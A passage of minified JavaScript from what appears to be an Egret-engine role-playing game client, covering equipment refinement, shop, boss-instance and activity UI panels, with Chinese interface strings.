eui.ArrayCollection([]),this.item.data=null,this.item.clearIcon(),this.item.clearTiSheng(),this.curEacCfg=null,this.costMoney.text="",this.costYb.text="",this.costStone.text="",this.nowPower.text="",this.cleaPower.text="",this.ql.text="",this.type.text="",this.job.text="",this.lv.text="",this.lbDesc.text="",this.nowAttr.text="",this.clearAttr.text="",this.power.text="",this.useYb.selected=!1,this.isUseYb=0,this.lockAc.replaceAll([]),this.btnClear.enabled=!1,this.btnPreserve.enabled=!1,this.useYb.enabled=!1,void(this.costCm.visible=!1);if(this.btnClear.enabled=!0,this.btnPreserve.enabled=!0,this.useYb.enabled=!0,o){var w=t[o.quality];
for(var r in w){var I=w[r];if(o.itemConfig.level>=I.interval[0]&&o.itemConfig.level<=I.interval[1]){this.curEacCfg=I;break}}}this.costCm.visible=!0,this.costCm.setData({type:0,id:e,count:1}),this.onCheck(),this.item.data=o;var _=l.QUALITY_NAME[o.quality],S=h.ItemUtil.getQualityColor(o.quality);this.ql.textFlow=d.TextFlowMaker.generateTextFlow(gettext("品质:|C:{0}&T:{1}|",S,_));var x=u.GlobalConfig.ItemConfig[o.configID],D=h.ItemUtil.getSubType(x),A=p.Role.getEquipNameByType(D);this.type.textFlow=d.TextFlowMaker.generateTextFlow(gettext("类型:|C:0xFFFFFF&T:{0}|",A));var k=h.ItemUtil.getJob(x);if(this.job.textFlow=d.TextFlowMaker.generateTextFlow(gettext("职业:|C:0xFFFFFF&T:{0}|",p.Role.getJobNameByJob(k))),this.lv.textFlow=d.TextFlowMaker.generateTextFlow(gettext("等级:|C:0x00FF00&T:{0}{1}级|",x.zsLevel>0?x.zsLevel+gettext("转"):"",x.level||1)),this.lbDesc.textFlow=d.TextFlowMaker.generateTextFlow(gettext("当前累计已使用{0}数量：{1}",this.StrArr[1],o.xilian)),this.PanelType==C.PANEL_TYPE.Soul){var B="|C:0xFF2121&T:"+l.SOUL_NAME[o.extAttQuality[0]]+"\n";this.nowAttr.textFlow=d.TextFlowMaker.generateTextFlow(B+c.AttributeData.getAttrShowStr(o.extAtt,":",[5]))}else this.nowAttr.textFlow=d.TextFlowMaker.generateTextFlow(c.AttributeData.getAttrShowStr(o.supExtAtt,":",o.supExtAttQuality));this.power.text=gettext("战力:")+o.point;var P=this.keepArr,R=this.PanelType==C.PANEL_TYPE.Soul?"|C:0xFF2121&T:"+l.SOUL_NAME[this.quilyArr[0]||0]+"\n":"",E=this.PanelType==C.PANEL_TYPE.Soul?[5]:this.quilyArr,G=R+c.AttributeData.getAttrShowStr(P,":",E);if(this.clearAttr.textFlow=d.TextFlowMaker.generateTextFlow(G),this.cleaPower.text="",this.nowPower.text=gettext("当前战力:")+o.point,P&&0!=P.length){var M=this.PanelType==C.PANEL_TYPE.Soul?h.ItemUtil.getAttrPower(o.extAtt):h.ItemUtil.getAttrPower(o.supExtAtt),L=o.point-M+h.ItemUtil.getAttrPower(P),F=L>o.point?"#45FF7A":"#FF2121";this.cleaPower.textFlow=(new egret.HtmlTextParser).parse(gettext("{0}战力:<a color={1}> {2}</a>",this.StrArr[0],F,L)),gettext("{0}战力:",this.StrArr[0])+L}else this.cleaPower.text="";var O=1==this.eTab.selectedIndex;this.equipBagIndex=O?-1:o.subType2,this.isUseYb=this.useYb.selected?1:0,this.lstLock.validateNow(),this.setItemAtt(o)}},e.prototype.setItemAtt=function(t){for(var e=t?c.AttributeData.getAttrNum2(t.supExtAtt):0,i=[],n=0;e>n;n++){var o={};i.push(o)}this.lockAc.replaceAll(i)},e.prototype.updateTab=function(){var t,e,i;if(!(this.tabEquip.numElements<this.beforeIndex)){var n=this.tabEquip.getElementAt(this.beforeIndex);n&&(null===(t=n.item)||void 0===t?void 0:t.setLock(null===(i=null===(e=n.item)||void 0===e?void 0:e.data)||void 0===i?void 0:i.lock)),this.setTabEquipSel(this.beforeIndex);var o=this.resultData[this.tabEquip.selectedIndex];o&&(this.item.data=o)}},e.prototype.onItemTap=function(t){var e=this;void 0!=o.EquipCT.ins().clearEquipUid&&(o.EquipCT.ins().clearEquipUid=null),void 0!=o.EquipCT.ins().clearTab&&(o.EquipCT.ins().clearTab=null),this.tabEquip.selectedIndex!=this.beforeIndex&&(this.useYb0.selected=!1,0!=this.keepArr.length?(this.setTabEquipSel(this.beforeIndex),g.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",this.StrArr[0]),function(){e.beforeIndex=t.itemIndex,e.setTabEquipSel(e.beforeIndex),e.changetabEquip()},this)):(this.beforeIndex=t.itemIndex,this.setTabEquipSel(this.beforeIndex),this.changetabEquip()))},e.prototype.reckonIdx=function(){var t;if(this.tabEquip.selectedIndex>0||this.beforeIndex)return this.tabEquip.selectedIndex||this.beforeIndex;if(!this.IdxEquipUid)return 0;for(var e=0;e<(null===(t=this.resultData)||void 0===t?void 0:t.length);e++)if(this.resultData[e].handle==this.IdxEquipUid)return e;return 0},e.prototype.reckonScV=function(){var t,e,i;if(!(null===(t=this.resultData)||void 0===t?void 0:t.length))return 0;var n=this.tabEquip.height,o=118,s=Math.floor(n/o);if(this.tabEquip.validateNow(),this.resultData.length<=s||this.tabEquip.selectedIndex<=s)return 0;var a=this.tabEquip.selectedIndex*o;return(null===(e=this.resultData)||void 0===e?void 0:e.length)-this.tabEquip.selectedIndex<s&&(a-=(s-((null===(i=this.resultData)||void 0===i?void 0:i.length)-this.tabEquip.selectedIndex))*o),a},e.prototype.onlstLock=function(t){this.lstLock.selectedItems.length>2&&(this.lstLock.selectedIndices.pop(),this.lstLock.selectedItems.pop());var e=this.lstLock.selectedIndices.length;switch(e){case 0:this.lock1=0,this.lock2=0;break;case 1:this.lock1=this.lstLock.selectedIndices[0]+1,this.lock2=0;break;case 2:this.lock1=this.lstLock.selectedIndices[0]+1,this.lock2=this.lstLock.selectedIndices[1]+1}this.costTimes=e+1,this.lstLock.validateNow(),this.onCheck()},e.prototype.cleanlockView=function(){this.lstLock.selectedIndices=[],this.lstLock.selectedItems=[],this.lock1=0,this.lock2=0,this.PanelType==C.PANEL_TYPE.Soul&&(this.lock2=99),this.lockAc.replaceAll([]),this.costTimes=1},e.prototype.changetabEquip=function(){if(this.CleanData(),this.cleanlockView(),this.PanelType==C.PANEL_TYPE.Soul)return void this.updateView();var t=this.resultData[this.tabEquip.selectedIndex];this.rpcInfo([t.handle],this.equipBagIndex)},e.prototype.onCheck=function(){if(this.costYb.visible=this.useYb.selected,this.costStone.visible=!this.useYb.selected,this.isUseYb=this.useYb.selected?1:0,this.costMoney.textFlow=d.TextFlowMaker.generateTextFlow(gettext("金币消耗:|C:{0}&T:{1}|/{2}",f.ActorCC.gold>=this.curEacCfg.costGold?4587386:16711680,f.ActorCC.gold,this.curEacCfg.costGold)),this.costStone.visible){var t=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,this.CfgDic.AffixBaseCfgCost);this.costStone.textFlow=d.TextFlowMaker.generateTextFlow(gettext("{0}:|C:{1}&T:{2}|/{3}",this.StrArr1[0],t>=this.curEacCfg.costNums?4587386:16711680,t,this.curEacCfg.costNums*(2*(this.costTimes-1)||1)))}if(this.costYb.visible){var e=this.curEacCfg.costNums*this.CfgDic.StoreCfg.cost.count*(2*(this.costTimes-1)||1);this.costYb.textFlow=d.TextFlowMaker.generateTextFlow(gettext("元宝消耗:|C:{0}&T:{1}|/{2}",f.ActorCC.yb>=e?4587386:16711680,f.ActorCC.yb,e))}},e.prototype.onCheckSoul=function(){this.lock2=this.useYb0.selected?0:99},e.prototype.onChangeTab=function(t){var e=this;this.beforeIndex=0,this.tabEquip.selectedIndex=0,void 0!=o.EquipCT.ins().clearEquipUid&&(o.EquipCT.ins().clearEquipUid=null),void 0!=o.EquipCT.ins().clearTab&&(o.EquipCT.ins().clearTab=null),this.IdxTab!=t.itemIndex&&(this.eTab.selectedIndex=this.IdxTab,this.init1=!0,0!=this.keepArr.length?g.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",this.StrArr[0]),function(){e.IdxTab=t.itemIndex,e.eTab.selectedIndex=e.IdxTab,e.updateChangeTab(),e.useYb0.selected=!1,e.onCheckSoul()},this):(this.IdxTab=t.itemIndex,this.eTab.selectedIndex=this.IdxTab,this.cleanlockView(),this.updateChangeTab()))},e.prototype.updateChangeTab=function(){this.resultData=[];var t,e=this.PanelType==C.PANEL_TYPE.Clear?0:4;if(0==this.eTab.selectedIndex){for(var i=[],n=a.SubRoles.ins().getSubRoleByIndex(0),r=0;10>r;r++){var l=n.getEquipByIndex(r);t=l.item,o.EquipCT.ins().isNoShow(t.itemConfig)||l.item.configID&&l.item.quality>e&&i.push(t)}this.resultData=i;for(var r=0;5>r;r++);}else{for(var u=s.BagCT.ins().getBagEquipsByMinQuality(0),p=[],r=0;r<u.length;r++)o.EquipCT.ins().isNoShow(u[r].itemConfig)||u[r].quality<=e||h.ItemUtil.isMasterEquip(u[r].itemConfig)||p.push(u[r]);this.resultData=p}if(this.tabEquipAC.replaceAll(this.resultData),this.init1&&(this.init1=!1,this.tabSc.validateNow(),this.setTabEquipSel(this.beforeIndex=this.reckonIdx()||0),this.tabSc.viewport.scrollV=this.reckonScV()||0),this.tabSc.viewport.scrollV&&this.tabEquip.selectedIndex<=0&&(this.tabSc.viewport.scrollV=0),this.resultData&&0!=this.resultData.length){-1==this.tabEquip.selectedIndex&&this.setTabEquipSel(0),t=this.resultData[this.tabEquip.selectedIndex];var d=0==this.eTab.selectedIndex;this.equipBagIndex=d?-1:t.subType2,this.rpcInfo([t.handle],this.equipBagIndex)}this.CleanData(),this.updateView()},e.prototype.onClick=function(t){var e,i,n=this,o=this.resultData[this.tabEquip.selectedIndex];switch(t.currentTarget){case this.btnClear:var a=this.CfgDic.AffixBaseCfgCost,r=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,a),h=this.curEacCfg.costNums*this.CfgDic.StoreCfg.cost.count,p=!1;if(this.PanelType==C.PANEL_TYPE.Clear)0==this.isUseYb?this.curEacCfg.costNums*(2*(this.costTimes-1)||1)<=r?p=!0:(T.WarnCT.ins().setBuyGoodsWarn(this.CfgDic.AffixBaseCfgCost,1,!0),b.GameFlashSaleCt.ins().reportXLSMaterialNot()):this.curEacCfg.costNums*(2*(this.costTimes-1)||1)<=r||(2*(this.costTimes-1)||1)*h<=f.ActorCC.yb?p=!0:m.TipsCT.ins().showTips(gettext("元宝不足"));else if(this.PanelType==C.PANEL_TYPE.Soul){var d=o?c.AttributeData.getAttrNum(o.extAtt):0;if(2==o.extAtt.length&&2==d&&0==this.lock1&&0==this.lock2)p=!1;else{var y=1,w=u.GlobalConfig.EquipAffixBaseConfig.castSoulPrefixCostCount,I=0==this.lock1?1:2,_=this.useYb0.selected?w:0,S=y*I+_;p=v.GlobalFun.checkCost(S,a)}}for(var x=this.keepArr||[],D=0;D<x.length;D++){var A=Math.floor(D/2);if(this.PanelType==C.PANEL_TYPE.Clear&&x[D].value&&u.GlobalConfig.AttrConfig[x[D].type].height&&-1==this.lstLock.selectedIndices.indexOf(A))return void g.WarnWin.show(gettext("是否对稀有属性|C:{0}&T:{1}|进行{2}?",l.QUALITY_COLOR[4],u.GlobalConfig.AttrConfig[x[D].type].name,this.StrArr[0]),function(){n.btnClear.enabled=!1,n.rpcChange(o.handle,n.equipBagIndex,n.isUseYb,n.lock1,n.lock2)},this)}p&&(this.btnClear.enabled=!1,this.rpcChange(o.handle,this.equipBagIndex,this.isUseYb,this.lock1,this.lock2));break;case this.btnPreserve:if(!this.keepArr.length)return;this.rpcSave(o.handle,this.equipBagIndex);break;case this.btnHelp:win.open("CommonHelpWin",(null===(e=this.CfgDic.HelpCfg)||void 0===e?void 0:e.text)||"");break;case this.btnHelp2:win.open("CommonHelpWin",(null===(i=this.CfgDic.HelpCfg2)||void 0===i?void 0:i.text)||"")}},e.prototype.rpcInfo=function(t,e){},e.prototype.rpcChange=function(t,e,i,n,o){},e.prototype.rpcSave=function(t,e){},e.prototype.updateData=function(){},e.prototype.CleanData=function(){},__decorate([delayCall(100)],e.prototype,"setTabEquipSel",null),__decorate([delayCall(100)],e.prototype,"updateChangeTab",null),e}(n.BaseView);e.EquipClearPanel=w,window.EquipClearPanel=w,__reflect(w.prototype,"EquipClearPanel",[]),window.EquipClearPanel=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingRedPoint=void 0;var n=i(14),o=i(99),s=i(26),a=i(4),r=i(6),l=i(13),h=i(7),u=i(15),p=i(12),d=function(t){function e(){var e=t.call(this)||this;return e.redPoint=!1,e.openRps=[],e.gradeupRps=[],e.aptitudeRps=[],e.flyUpRps=[],observe(e,e.postRedPoint,s.ZsCT.ins().postZsData,a.ActorCC.postLevelChange,r.BagCT.ins().postItemAdd,r.BagCT.ins().postItemDel,r.BagCT.ins().postItemChange,o.WingCC.postUseDanSuccess,Ts.wingBoost.levelup,o.WingCC.postActivate,h.GameServerCC.postServerOpenDay),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){var t=this.redPoint;this.redPoint=!1;return;for(var e=0;e<l.SubRoles.MAX_ROLES;e++){var i=l.SubRoles.ins().getSubRoleByIndex(e);i&&this.updateWingRep(e)&&(this.redPoint=!0)}return t==this.redPoint?null:this.redPoint},e.prototype.updateWingRep=function(t){var e=!1,i=p.OpenSystem.ins().checkSysOpen(u.SystemType.Wing);return i?(this.openRps[t]=o.WingCC.isHaveActivationWing(t),this.gradeupRps[t]=o.WingCC.canItemGradeupWing(t),this.aptitudeRps[t]=o.WingCC.canUseAptitudeByRoleID(t),this.flyUpRps[t]=o.WingCC.canUseFlyUpByRoleID(t),e||(e=this.openRps[t]||this.gradeupRps[t]||this.aptitudeRps[t]||this.flyUpRps[t]),e):void 0},__decorate([post()],e.prototype,"postRedPoint",null),e}(n.BaseSystem);e.WingRedPoint=d,window.WingRedPoint=d,__reflect(d.prototype,"WingRedPoint",[]),Systemap.WingRedPoint=function(){return d.ins()},window.WingRedPoint=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WeekMarketItem=void 0;var n=i(3),o=i(52),s=i(5),a=i(18),r=i(25),l=i(66),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WeekMarketItemSKin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data&&this.data.goods){var t=this.data,e=Math.max(0,t.Maxcount-o.Shop.ins().getWeekNumById(t.index));this.eNum.textFlow=t.Maxcount?s.TextFlowMaker.generateTextFlow1(gettext("限购:|C:{0}&T:{1}|/{2}",e>0?a.ColorUtil.GREEN:a.ColorUtil.RED,e,t.Maxcount)):s.TextFlowMaker.generateTextFlow1(""),this.itemIcon.data=t.goods,this.money2.visible=!!t.rid,this.money.visible=!t.rid,this.eBuy.visible=e>0,this.exbuy.visible=0>=e,t.rid?this.money2.text=l.PayUtils.getPayUnitStr(r.Recharge.ins().getCashByRid(t.rid)/100,urlParam.payUnit):this.money.setData(t.cost),this.zkImg.visible=t.discount?!0:!1;var i=getLangType();i==LanguageEnum.CN||i==LanguageEnum.CN1?this.discountNum.text=t.discount?t.discount/10+"折":"":this.discountNum.text=t.discount?100-t.discount+"折":"",void 0!=t.pcost&&this.exGrp.parent?this.exGold.text=gettext("原价{0}",t.pcost):this.exGrp.parent&&this.exGrp.parent.removeChild(this.exGrp)}},e}(n.BaseItemRender);e.WeekMarketItem=h,window.WeekMarketItem=h,__reflect(h.prototype,"WeekMarketItem",[]),window.WeekMarketItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixreincarnationsWin=void 0;var n=i(1),o=i(0),s=i(15),a=i(12),r=i(2),l=i(121),h=i(79),u=i(506),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="SixTrialsFbSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=u.SixreincarnationsItem,this.list.dataProvider=this.bData=new eui.ArrayCollection,this.addEvent(eui.ItemTapEvent.ITEM_TAP,this.eTab,this.typeChangeHandler)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateView()},e.prototype.updateView=function(){var t=o.GlobalConfig.SixUndergroundPalacesLayerConfig,e=[];for(var i in t){var n=!1;l.LhCT.ins().lv>=t[i].samsaraLimit&&(n=!0);var s={layer:t[i].id,names:t[i].name,desc:this.returnLimit(t[i]),show:n,award:t[i].preReward,icon:t[i].iconName,fontName:t[i].fontName};e.push(s)}this.bData.replaceAll(e),this.bData.refresh()},e.prototype.returnLimit=function(t){var e,i="",n=t.samsaraLimit;return i=0==n?gettext("七转"):null===(e=o.GlobalConfig.SamsaraLevelConfig[n])||void 0===e?void 0:e.lvName},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.OpenSystem.ins().checkSysOpen(s.SystemType.SixReincarnations);i||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(s.SystemType.SixReincarnations));var n=h.SixReisCT.ins().formatStrTimeToArr();return i&&n},e.prototype.typeChangeHandler=function(){},e}(n.BaseView);e.SixreincarnationsWin=p,window.SixreincarnationsWin=p,__reflect(p.prototype,"SixreincarnationsWin",[]),window.SixreincarnationsWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSkillBookItem=void 0;var n=i(77),o=i(60),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this),this.updateSelect()},e.prototype.updateSelect=function(){if(!this.data)return this.setSelect(!1),void this.clearIcon();var t=this.data.configID==o.WarSoulCT.ins().curSelSkillBookId;this.setSelect(t)},e.prototype.onClick=function(t){},e}(n.ItemBaseNoName);e.WarSoulSkillBookItem=s,window.WarSoulSkillBookItem=s,__reflect(s.prototype,"WarSoulSkillBookItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSkillItem=void 0;var n=i(3),o=i(0),s=i(1350),a=i(60),r=function(t){function e(){var e=t.call(this)||this;return e.isShowLock=!1,e.isLock=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEvent(this,this.onTap)},e.prototype.dataChanged=function(){if(this.skin&&null!=this.data){if(0==this.data)return this.setLock(!1),void(this.icon.source="");var t=o.GlobalConfig.WarSoulSkillConfig[this.data.id];t&&(this.updateLock(),this.imgBg.source=this.data.isPro?"ws_skill_kuang4":"ws_skill_kuang3",this.icon.source=t.icon+"_png",this.imgLock.source=this.isLock?"ws_btn_lock1":"ws_btn_lock2",this.imgLock.visible=this.isShowLock)}},e.prototype.onTap=function(t){return this.data?t.target==this.imgLock?void a.WarSoulCT.ins().setLockSkill(this.data.id,!this.isLock):void win.open(s.WarSoulSkillTipsWin,this.data):void 0},e.prototype.updateLock=function(){this.isLock=this.data&&-1!=a.WarSoulCT.ins().lockSkillIdList.indexOf(this.data.id),this.imgLock.source=this.isLock?"ws_btn_lock1":"ws_btn_lock2"},e.prototype.setLock=function(t){this.isLock=t,this.imgLock.source=t?"ws_btn_lock1":"ws_btn_lock2"},e.prototype.setLockShow=function(t){this.isShowLock=t,this.imgLock.visible=t,this.isShowLock&&(this.imgLock.source=this.isLock?"ws_btn_lock1":"ws_btn_lock2")},e}(n.BaseItemRender);e.WarSoulSkillItem=r,window.WarSoulSkillItem=r,__reflect(r.prototype,"WarSoulSkillItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShiKongZhiJingFbView=void 0;var n=i(8),o=i(5),s=i(1),a=i(11),r=i(0),l=i(10),h=i(23),u=i(7),p=i(75),d=i(190),c=i(1375),f=i(1376),g=function(t){function e(){var e=t.call(this)||this;return e._sn_="ShiKongZhiJingFbSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listBoss0.itemRenderer=f.Shikongzhijingitem,this._bossList=new eui.ArrayCollection,this.listBoss0.dataProvider=this._bossList,this.eTab.itemRenderer=c.ShikongzhijingTypeitem,this._typeArr=new eui.ArrayCollection,this.eTab.dataProvider=this._typeArr,this.eItem0.itemRenderer=a.ItemBase,this._rewardArr0=new eui.ArrayCollection,this.eItem0.dataProvider=this._rewardArr0,this.eItem1.itemRenderer=a.ItemBase,this._rewardArr1=new eui.ArrayCollection,this.eItem1.dataProvider=this._rewardArr1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._selBossIndex=t[0]||0,this._selType=t[1]||1,this._burningDesertFbCfg=t[2]||r.GlobalConfig.HotDesertFbConfig[p.HotDesertFbEnum.ShiKongZhiJing],this.observe(p.BurningDesertCT.ins().buildRoomBack,this.toOpenRoomView),this.observe(p.BurningDesertCT.ins().bossInfoBack,this.flusBossReliveInfo),this.addEvent(eui.ItemTapEvent.ITEM_TAP,this.listBoss0,this.bossSelHandler),this.addEvent(eui.ItemTapEvent.ITEM_TAP,this.eTab,this.typeChangeHandler),this.addEvent(egret.TouchEvent.TOUCH_TAP,this.fight,this.onClickHandler),this.addEvent(egret.TouchEvent.TOUCH_TAP,this.btn_help,this.onClickHandler),this.flusList(),p.BurningDesertCT.ins().reqBossInfo()},e.prototype.onClickHandler=function(t){var e;switch(t.currentTarget){case this.fight:p.BurningDesertCT.ins().roomId<=0?p.BurningDesertCT.ins().reqBuildRoom(this._selType):this.toOpenRoomView();break;case this.btn_help:win.open("CommonHelpWin",(null===(e=r.GlobalConfig.HelpInfoConfig[316])||void 0===e?void 0:e.text)||"")}},e.prototype.toOpenRoomView=function(){p.BurningDesertCT.ins().roomId>0&&win.open(d.BurningDesertRoomView)},e.prototype.flusBossReliveInfo=function(){if(this._selCfg&&p.BurningDesertCT.ins().bossInfoDic){var t=p.BurningDesertCT.ins().bossInfoDic[this._selCfg.id];if(0>=t||void 0==t)Timer.stop(this.flusTimeFun,this),this.reborn.visible=!1;else{var e=u.GameServerCC.serverTime;t=n.DateUtils.formatMiniDateTime(t),e>=t?(Timer.stop(this.flusTimeFun,this),this.reborn.visible=!1):(this.reborn.visible=!0,this.reborn.text=gettext("复活中：{0}",n.DateUtils.getFormatBySecond(Math.ceil(.001*(t-e)))),this.flusTimeFun(),Timer.has(this.flusTimeFun,this)||Timer.start(1e3,0,this.flusTimeFun,this))}}},e.prototype.flusTimeFun=function(){var t=p.BurningDesertCT.ins().bossInfoDic[this._selCfg.id];t=n.DateUtils.formatMiniDateTime(t);var e=t-u.GameServerCC.serverTime;e>0?(this.reborn.visible=!0,this.reborn.text=gettext("复活中：{0}",n.DateUtils.getFormatBySecond(Math.ceil(.001*e)))):(this.reborn.visible=!1,Timer.stop(this.flusTimeFun,this))},e.prototype.flusList=function(){for(var t=[],e=p.BurningDesertCT.ins().getShiKongZhiJingBossList(0),i=0,n=e;i<n.length;i++){var o=n[i];t.indexOf(o.bossLv)<0&&t.push(o.bossLv)}for(var s=[],a=0,r=t.length;r>a;a++)s.push({type:t[a],isSel:this._selType==t[a]});this._typeArr.replaceAll(s);var l=[],h=p.BurningDesertCT.ins().getShiKongZhiJingBossList(this._selType);this._selCfg=h[this._selBossIndex];for(var a=0,r=h.length;r>a;a++){var u=h[a];l.push({cfg:u,isSel:this._selCfg.bossId==u.bossId})}this._bossList.replaceAll(l),this.flusSelInfo()},e.prototype.bossSelHandler=function(){this._selBossIndex=this.listBoss0.selectedIndex,this.flusList()},e.prototype.typeChangeHandler=function(){this._selType=this.eTab.selectedIndex+1,this.flusList()},e.prototype.flusSelInfo=function(){if(this._selCfg){var t=r.GlobalConfig.MonstersConfig[this._selCfg.bossId];this.boss_name.text=null===t||void 0===t?void 0:t.name,this.boss_pic.source=this._selCfg.showImg+"_png";var e=r.GlobalConfig.InstanceConfig[this._selCfg.fbId];this.pow.text=gettext("推荐战力：{0}",(null===e||void 0===e?void 0:e.powerlimit)||0);var i=(null===t||void 0===t?void 0:t.crusade)||0,n=h.GameLogic.ins().kfCost>=i?l.ItemUtil.getQualityColor(1):l.ItemUtil.getQualityColor(5);this.leftfight.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("剩余讨伐令：{0}","|C:"+n+"&T:"+h.GameLogic.ins().kfCost,"/"+i));var s=p.BurningDesertCT.ins().assistCount||0;n=s>0?l.ItemUtil.getQualityColor(1):l.ItemUtil.getQualityColor(5),this.helptimes.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("剩余协助次数：{0}","|C:"+n+"&T:"+s)),this._rewardArr0.source=this._selCfg.ownRewardShow,this._rewardArr0.refresh(),this._rewardArr1.source=this._selCfg.helpRewardShow,this._rewardArr1.refresh(),this.flusBossReliveInfo(),p.BurningDesertCT.ins().selBossLv=this._selCfg.bossLv}},e.prototype.removeDisplay=function(){},e}(s.BaseView);e.ShiKongZhiJingFbView=g,window.ShiKongZhiJingFbView=g,__reflect(g.prototype,"ShiKongZhiJingFbView",[]),window.ShiKongZhiJingFbView=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBaseEff5=void 0;var n=i(3),o=i(21),s=i(16),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.skin&&(this.item.data=this.data,this.showSpecialEffect())},e.prototype.showSpecialEffect=function(){if(this.data){var t=this.data.showEff||0;t>0?(this._ffect=this._ffect||new o.MovieClip,this._ffect.parent||this.eG.addChild(this._ffect),this._ffect.playFile(RES_DIR_EFF+"ValueEff2",-1)):this._ffect&&s.DisplayUtils.removeFromParent(this._ffect)}},e}(n.BaseItemRender);e.ItemBaseEff5=a,window.ItemBaseEff5=a,__reflect(a.prototype,"ItemBaseEff5",[]),window.ItemBaseEff5=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget4Item=void 0;var n=i(3),o=i(5),s=i(203),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data[0];t.ranking<=3?(this.eBg.source="act4_itemb"+t.ranking,this.eRankImg.source="act4_r"+t.ranking,this.eRankLab.text=""):(this.eBg.source="act4_itemb4",this.eRankImg.source="",this.eRankLab.text=t.ranking+""),this.eList0.dataProvider=new eui.ArrayCollection(t.rewards),this.eList1.dataProvider=new eui.ArrayCollection(t.rewards2);var e=s.ActivityType4Data.getTypeDesc(t.Id),i=this.data[1],n=gettext("|C:0xffd477&T:{0}|\n|C:0xfff7b0&T:即可上榜|",e+s.ActivityType4Data.getTarStr(t));i&&(n=gettext("|C:0xffd477&T:{0}|\n|C:0xfff7b0&T:{1}|",i.player,e+s.ActivityType4Data.getTarStr(t,i.value))),this.eName.textFlow=o.TextFlowMaker.generateTextFlow(n)}},e}(n.BaseItemRender);e.OSATarget4Item=a,window.OSATarget4Item=a,__reflect(a.prototype,"OSATarget4Item",[]),window.OSATarget4Item=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OpSelectItemPanel=void 0;var n=i(1),o=i(0),s=i(4),a=i(2),r=i(26),l=i(9),h=i(586),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="standardgiftSkin",e.giftListData=[],e.listIndex=0,e.listItemIndex=0,e.type=0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.id=t[0],this.listIndex=t[1],this.listItemIndex=t[2],this.type=t[3],this.addTouchEvent(this,this.onTouch),this.update()},e.prototype.update=function(){var t=o.GlobalConfig.OptionalGiftConfig[this.id];this.eList.itemRenderer=h.OpSelectItemRen;for(var e=[],i=0;i<t.options.length;i++){var n={id:t.show[0].reward[i].id,type:t.show[0].reward[i].type,count:t.show[0].reward[i].count};e.push(n)}this.giftListData=e,this.eList.dataProvider=new eui.ArrayCollection(e),this.eList.validateNow()},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){if(t.target==this.okBtn){if(this.eList.selectedIndex<0)return void a.TipsCT.ins().showTips(gettext("请选择一个奖励"));var e=o.GlobalConfig.OptionalGiftConfig[this.id],i=e.options[this.eList.selectedIndex];if(s.ActorCC.level<i.level)return void a.TipsCT.ins().showTips(gettext("人物等级{0}才能领取",i.level));if(r.ZsCT.ins().stage<i.zslimit)return void a.TipsCT.ins().showTips(gettext("转生等级{1}才能领取",i.zslimit));for(var n=this.giftListData[this.eList.selectedIndex],h=0,u=0;u<e.options.length;u++)if(e.options[u].itemid==n.id){h=u;break}var p={idx:this.listIndex,lisIdx:this.listItemIndex,value:h};70==this.type?l.Activity.ins().set70SelectItem(p):l.Activity.ins().set71SelectItem(p),win.close(this)}else if(t.target.parent.parent.parent.parent==this.eList){var d;if(this.eList.selectedIndex>=0&&this.eList.numElements>0)for(var u=0;u<this.eList.numElements;u++)d=this.eList.getChildAt(u),d.checkSelcted(this.eList.selectedIndex)}},e}(n.BaseView);e.OpSelectItemPanel=u,window.OpSelectItemPanel=u,__reflect(u.prototype,"OpSelectItemPanel",[]),window.OpSelectItemPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel3ItemRender=void 0;var n=i(5),o=i(3),s=i(23),a=i(9),r=function(t){function e(){var e=t.call(this)||this;return e.skinName="luckyTurntableItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){t.prototype.childrenCreated.call(this),this.isget.addEventListener(egret.TouchEvent.TOUCH_END,this.onTap,this)},e.prototype.onTap=function(t){var 